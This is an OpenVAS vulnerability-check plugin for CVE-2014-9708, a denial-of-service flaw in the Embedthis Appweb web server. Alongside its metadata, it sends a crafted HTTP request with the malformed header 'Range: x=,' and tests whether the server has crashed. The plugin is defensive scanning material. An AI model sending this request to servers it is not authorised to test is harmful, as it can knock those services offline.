###############################################################################
# OpenVAS Vulnerability Test
#
# Embedthis Appweb Web Server Remote Denial of Service Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805157");
  script_version("2021-10-21T13:57:32+0000");
  script_cve_id("CVE-2014-9708");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2021-10-21 13:57:32 +0000 (Thu, 21 Oct 2021)");
  script_tag(name:"creation_date", value:"2015-04-01 17:00:37 +0530 (Wed, 01 Apr 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Embedthis Appweb Web Server Remote Denial of Service Vulnerability");

  script_tag(name:"summary", value:"Embedthis Appweb Web Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  and check whether it is able to crash or not.");

  script_tag(name:"insight", value:"A NULL pointer dereference flaw in the
  parseRange() function in rx.c that is triggered when handling ranger headers
  in an HTTP request.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Embedthis Appweb version before 4.6.6
  and 5.x before 5.2.1");

  script_tag(name:"solution", value:"Update to version 4.6.6 or 5.2.1 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Mar/158");
  script_xref(name:"URL", value:"https://github.com/embedthis/appweb/issues/413");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

http_port = http_get_port(default:80);

rcvRes = http_get_cache(item: "/",  port:http_port);

useragent = http_get_user_agent();

if(">Embedthis" >< rcvRes && ">Appweb" >< rcvRes)
{
  sndReq = 'GET / HTTP/1.1\r\n' +
           'Host: ' +  http_host_name(port:http_port) + '\r\n' +
           'User-Agent: ' + useragent + '\r\n' +
           'Range: x=,\r\n' +
           '\r\n';

  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  ## This confirms it is not vulnerable
  if("416 Requested Range Not Satisfiable" >< rcvRes) exit(0);

  soc = open_sock_tcp(http_port);
  if(!soc)
  {
    security_message(http_port);
    exit(0);
  }
  close(soc);
}

exit(99);
